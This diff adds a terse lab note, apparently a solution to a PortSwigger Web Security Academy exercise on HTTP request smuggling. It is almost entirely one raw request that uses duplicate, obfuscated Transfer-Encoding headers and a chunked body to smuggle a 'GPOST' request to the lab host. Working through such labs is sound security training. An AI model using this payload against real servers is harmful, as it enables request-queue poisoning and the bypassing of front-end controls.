@@ -1,0 +1,34 @@
+HTTP request smuggling, obfuscating the TE header
+Require - uncheck "Update Content-Length" from Repeator.
+Require - include the trailing sequence \r\n\r\n following the final 0.
+
+
+POST / HTTP/1.1
+Host: 0ae4006804a57b44c09d375300eb0060.web-security-academy.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+Transfer-encoding: x
+
+9D
+GPOST / HTTP/1.1
+Host: 0ae4006804a57b44c09d375300eb0060.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 8
+
+foo=
+0
+
+
